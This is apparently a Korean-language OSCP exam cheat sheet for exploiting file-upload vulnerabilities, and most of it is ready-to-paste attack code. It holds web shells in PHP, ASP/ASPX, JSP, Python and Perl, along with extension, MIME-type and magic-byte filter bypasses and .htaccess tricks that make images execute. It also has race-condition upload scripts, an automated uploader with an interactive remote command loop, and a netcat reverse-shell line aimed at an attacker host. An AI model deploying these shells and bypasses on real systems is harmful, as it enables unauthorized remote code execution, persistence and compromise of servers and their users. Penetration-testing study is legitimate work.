# File Upload - OSCP 공격 가이드

> **목표: 파일 업로드 취약점을 통한 웹쉘 업로드 → 즉시 시스템 접근**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🐘 PHP 웹쉘

```php
# 기본 PHP 웹쉘
<?php system($_GET['cmd']); ?>

# 더 기능이 많은 PHP 웹쉘
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
die();
?>

# 한 줄 PHP 웹쉘
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

# eval 기반 웹쉘
<?php eval($_POST['cmd']); ?>

# 파일 업로드 + 실행 웹쉘
<?php
if($_FILES['f']['name']){
    move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);
}
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

### 🖥️ ASP/ASPX 웹쉘

```asp
# ASP 웹쉘
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.write("<pre>")
    Response.write(oExec.StdOut.ReadAll)
    Response.write("</pre>")
End If
%>

# ASPX 웹쉘
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
    string ExcuteThis = Request.Form["cmd"];
    if (ExcuteThis != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + ExcuteThis;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
<form><input name="cmd" type="text"><input type="submit" value="Run"></form>
```

### ☕ JSP 웹쉘

```jsp
# JSP 웹쉘
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>

# 더 안정적인 JSP 웹쉘
<%@ page import="java.io.*" %>
<form method="GET" name="myform" action="">
<input type="text" name="cmd">
<input type="submit" value="Send">
</form>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
</pre>
```

### 🔧 기타 언어 웹쉘

```python
# Python CGI 웹쉘
#!/usr/bin/env python
import cgi, os
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    print("Content-Type: text/html\n")
    print("<pre>")
    os.system(cmd)
    print("</pre>")

# Perl CGI 웹쉘
#!/usr/bin/perl
use CGI;
$cgi = new CGI;
$cmd = $cgi->param('cmd');
if ($cmd) {
    print "Content-Type: text/html\n\n";
    print "<pre>";
    system($cmd);
    print "</pre>";
}
```

## 🎯 상황별 페이로드

### 📁 확장자별 업로드

```bash
# PHP 서버 확장자들
shell.php
shell.php3
shell.php4
shell.php5
shell.phtml
shell.pht
shell.phps

# ASP 서버 확장자들
shell.asp
shell.aspx
shell.cer
shell.asa

# JSP 서버 확장자들
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf

# 기타 실행 가능 확장자들
shell.pl
shell.py
shell.rb
shell.cgi
```

### 🖼️ 이미지 파일 위장

```bash
# GIF 헤더 + PHP 코드
GIF89a
<?php system($_GET['cmd']); ?>

# PNG 헤더 + PHP 코드
PNG
<?php system($_GET['cmd']); ?>

# JPEG 헤더 + PHP 코드
ÿØÿà
<?php system($_GET['cmd']); ?>

# BMP 헤더 + PHP 코드
BM
<?php system($_GET['cmd']); ?>
```

### 📄 .htaccess 업로드

```apache
# .htaccess 파일로 PHP 실행 활성화
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# 모든 파일을 PHP로 실행
AddType application/x-httpd-php .shell

# CGI 스크립트 활성화
AddHandler cgi-script .pl
AddHandler cgi-script .py
Options +ExecCGI

# PHP 실행을 위한 설정
<FilesMatch "\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>
```

### 📦 압축 파일 업로드

```bash
# ZIP 파일로 업로드 후 압축 해제
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# TAR 파일로 업로드
echo '<?php system($_GET["cmd"]); ?>' > shell.php
tar -cf shell.tar shell.php

# 압축 해제 후 디렉토리 순회
# shell.php를 ../../../webroot/shell.php로 압축
```

## 🔄 우회 기법들

### 🏷️ 확장자 필터 우회

```bash
# 더블 확장자
shell.php.jpg
shell.asp.png
shell.jsp.gif

# 대소문자 조합
shell.PHP
shell.PhP
shell.pHp
shell.Asp
shell.JSP

# 특수문자 추가
shell.php.
shell.php%00
shell.php%20
shell.php%0a
shell.php%00.jpg
shell.php%0d%0a.jpg

# 유니코드 우회
shell.ph%70
shell.%70hp
shell.p%68p

# 점과 공백 조합
shell.php.....
shell.php
shell.php\x00
shell.php::$DATA
```

### 📋 MIME 타입 우회

```bash
# Burp Suite에서 MIME 타입 변경
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream

# 유효한 이미지 + PHP 코드 결합
# 실제 이미지 파일에 PHP 코드 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 🔢 매직 바이트 우회

```bash
# 실제 이미지 매직 바이트 + PHP 코드
# GIF
echo -e 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x21\xF9\x04\x00\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x0C\x00\x3B<?php system($_GET["cmd"]); ?>' > shell.gif

# PNG
echo -e '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xdb\x00\x00\x00\x00IEND\xaeB`\x82<?php system($_GET["cmd"]); ?>' > shell.png

# JPEG
echo -e '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),01444\x1f\'9=82<.342\xff\xc0\x00\x11\x08\x00\x01\x00\x01\x01\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00\xb2\xc0\x07\xff\xd9<?php system($_GET["cmd"]); ?>' > shell.jpg
```

### 🗂️ 파일명 조작

```bash
# 디렉토리 순회
../shell.php
../../shell.php
../../../webroot/shell.php
..%2fshell.php
..%5cshell.php

# 특수 파일명 (Windows)
shell.php::$DATA
shell.php:hidden.jpg
con.php
aux.php
prn.php
com1.php

# 긴 파일명으로 우회
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php

# Unicode 파일명
shell.%u0070%u0068%u0070
```

### ⚡ 경쟁 조건 (Race Condition)

```bash
# 업로드 후 즉시 실행 (파일이 삭제되기 전)
#!/bin/bash
while true; do
    curl -F "file=@shell.php" http://{TARGET_IP}/upload.php &
    curl http://{TARGET_IP}/uploads/shell.php?cmd=whoami &
    wait
done

# Python으로 Race Condition
import requests
import threading

def upload():
    files = {'file': open('shell.php', 'rb')}
    requests.post('http://{TARGET_IP}/upload.php', files=files)

def execute():
    requests.get('http://{TARGET_IP}/uploads/shell.php?cmd=whoami')

for i in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=execute).start()
```

## 🤖 자동화 도구 명령어

### 🔥 Burp Suite 활용

```bash
# 1. Burp Suite Intruder 설정
1. 업로드 요청을 Intercept
2. Send to Intruder
3. 파일명과 Content-Type을 Payload Position으로 설정
4. Payload Lists:
   - 파일명: shell.php, shell.php5, shell.phtml, shell.php.jpg
   - Content-Type: image/jpeg, image/png, text/plain

# 2. Burp Repeater로 수동 테스트
1. 업로드 요청을 Send to Repeater
2. 파일명, Content-Type, 매직바이트 등 수동 변경
3. Response 분석하여 성공 여부 확인

# 3. Burp Extension 활용
# Upload Scanner 확장 설치
1. Extender > BApp Store > Upload Scanner
2. 자동으로 다양한 우회 기법 테스트
```

### 🐍 커스텀 업로드 스크립트

```python
#!/usr/bin/env python3
import requests
import sys

def test_upload(url, file_param):
    # 다양한 확장자와 MIME 타입 조합
    payloads = [
        ('shell.php', 'application/x-php', '<?php system($_GET["cmd"]); ?>'),
        ('shell.php5', 'application/x-php', '<?php system($_GET["cmd"]); ?>'),
        ('shell.phtml', 'text/html', '<?php system($_GET["cmd"]); ?>'),
        ('shell.php.jpg', 'image/jpeg', 'GIF89a<?php system($_GET["cmd"]); ?>'),
        ('shell.gif', 'image/gif', 'GIF89a<?php system($_GET["cmd"]); ?>'),
        ('.htaccess', 'text/plain', 'AddType application/x-httpd-php .jpg')
    ]

    for filename, content_type, payload in payloads:
        files = {file_param: (filename, payload, content_type)}

        try:
            r = requests.post(url, files=files)
            print(f"[+] Uploaded: {filename} ({content_type}) - Status: {r.status_code}")

            # 업로드된 파일 접근 시도
            test_urls = [
                f"{url.rsplit('/', 1)[0]}/uploads/{filename}",
                f"{url.rsplit('/', 1)[0]}/{filename}",
                f"{url.rsplit('/', 1)[0]}/files/{filename}"
            ]

            for test_url in test_urls:
                try:
                    test_r = requests.get(f"{test_url}?cmd=whoami", timeout=5)
                    if test_r.status_code == 200 and "www-data" in test_r.text:
                        print(f"[SUCCESS] Shell at: {test_url}?cmd=whoami")
                        return test_url
                except:
                    pass

        except Exception as e:
            print(f"[-] Error uploading {filename}: {e}")

    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 upload_test.py <upload_url> <file_parameter>")
        sys.exit(1)

    shell_url = test_upload(sys.argv[1], sys.argv[2])
    if shell_url:
        print(f"\n[+] Interactive shell available at: {shell_url}")
        while True:
            cmd = input("$ ")
            if cmd.lower() in ['exit', 'quit']:
                break
            try:
                r = requests.get(f"{shell_url}?cmd={cmd}")
                print(r.text)
            except:
                print("[-] Error executing command")
```

### 🔧 파일 업로드 디렉토리 발견

```bash
# gobuster로 업로드 디렉토리 찾기
gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50 | grep -E "(upload|file|media|asset)"

# 일반적인 업로드 디렉토리들
/uploads/
/upload/
/files/
/media/
/assets/
/attachments/
/documents/
/images/
/pictures/
/tmp/
/temp/
```

### 🔍 자동화된 웹쉘 탐지

```bash
#!/bin/bash
# 업로드 후 웹쉘 자동 탐지 스크립트

TARGET="$1"
SHELL_NAME="$2"

DIRECTORIES=(
    "uploads"
    "upload"
    "files"
    "media"
    "assets"
    "tmp"
    "temp"
    "images"
)

for dir in "${DIRECTORIES[@]}"; do
    echo "[+] Testing: $TARGET/$dir/$SHELL_NAME"

    RESPONSE=$(curl -s "$TARGET/$dir/$SHELL_NAME?cmd=whoami" 2>/dev/null)

    if [[ $RESPONSE == *"www-data"* ]] || [[ $RESPONSE == *"root"* ]] || [[ $RESPONSE == *"nt authority"* ]]; then
        echo "[SUCCESS] Shell found at: $TARGET/$dir/$SHELL_NAME"
        echo "Response: $RESPONSE"
        exit 0
    fi
done

echo "[-] No shells found"
```

## 🚨 문제 해결

### ❌ 업로드가 안 될 때

```bash
# 1. 다른 파라미터명 시도
file=
upload=
attachment=
document=
image=
picture=

# 2. Content-Type 변경
Content-Type: multipart/form-data
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain

# 3. 파일 크기 줄이기
echo '<?=`$_GET[0]`?>' > mini.php  # 최소 크기 PHP 쉘

# 4. Base64 인코딩
echo 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' | base64 -d > shell.php

# 5. 다른 HTTP 메소드
PUT /upload/shell.php HTTP/1.1
<?php system($_GET['cmd']); ?>
```

### 🔍 업로드된 파일 못 찾을 때

```bash
# 1. Robots.txt 확인
curl http://{TARGET_IP}/robots.txt

# 2. 일반적인 위치들 확인
/uploads/
/upload/
/files/
/media/
/assets/
/tmp/
/temp/
/var/www/html/uploads/
/var/www/uploads/
/home/user/uploads/

# 3. 웹 소스코드에서 힌트 찾기
# 업로드 폼의 action 속성 확인
# JavaScript에서 업로드 경로 확인

# 4. 에러 메시지에서 경로 찾기
# 업로드 실패시 표시되는 절대 경로

# 5. 디렉토리 리스팅 확인
curl http://{TARGET_IP}/uploads/
curl http://{TARGET_IP}/files/
```

### 🚫 실행이 안 될 때

```bash
# 1. .htaccess로 PHP 활성화
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# 2. 다른 실행 방법
# CGI 스크립트로 시도
#!/bin/bash
echo "Content-Type: text/html"
echo ""
echo "<pre>"
$1
echo "</pre>"

# 3. Server-Side Include (SSI)
<!--#exec cmd="whoami" -->

# 4. JavaScript 기반 (Node.js 서버)
require('child_process').exec(require('url').parse(require('url').parse(document.URL).query, true).cmd, (e,s,d) => document.write('<pre>'+s+'</pre>'));

# 5. Python 기반
import os; os.system(request.args.get('cmd'))
```

### 🔄 필터가 강할 때

```bash
# 1. 파일 분할 업로드
# 일부분씩 나누어 업로드 후 서버에서 합치기

# 2. ZIP 압축 후 서버에서 압축 해제
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
zip shell.zip shell.txt

# 3. 이미지 파일에 PHP 코드 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' -overwrite_original image.jpg

# 4. 다중 파일 업로드
# 여러 파일을 동시에 업로드하여 필터 우회

# 5. 시간 지연 업로드
# 필터 시스템의 타임아웃을 이용
```

### 🎯 웹쉘 안정화

```bash
# 1. 더 기능이 많은 웹쉘로 교체
# c99.php, r57.php, 또는 커스텀 백도어

# 2. 지속성 확보
# cron job, startup script, 서비스 등록

# 3. 네트워크 백도어
# 네트워크를 통한 원격 접근 설정

# 4. 리버스 쉘로 전환
curl http://{TARGET_IP}/shell.php?cmd=nc%20-e%20/bin/sh%20{ATTACKER_IP}%20443
```

## 📊 성공 판정 기준

### ✅ 업로드 성공 확인

- **HTTP 200/201**: 파일 업로드 성공
- **파일 크기**: 업로드된 파일 크기가 0이 아님
- **에러 없음**: "File uploaded successfully" 등의 성공 메시지
- **디렉토리 리스팅**: 업로드 디렉토리에서 파일 확인

### ✅ 실행 성공 확인

- **명령어 출력**: `whoami`, `id` 명령어 실행 결과
- **시스템 정보**: `uname -a`, `systeminfo` 출력
- **에러 메시지**: PHP 파싱 에러가 아닌 실제 명령어 에러
- **HTTP 응답**: 200 상태코드와 의미있는 출력

### ⏰ 시간 관리

- **5분**: 기본 업로드 테스트 (PHP, ASP, JSP)
- **15분**: 확장자 우회 + MIME 타입 조작
- **25분**: 고급 우회 기법 + .htaccess 업로드
- **30분**: 경쟁 조건 + 압축 파일 + 이미지 위장
- **실패시**: 다른 웹 취약점으로 전환

**성공시 즉시 쉘 안정화!** → `SHELLS/shell-upgrade.md`
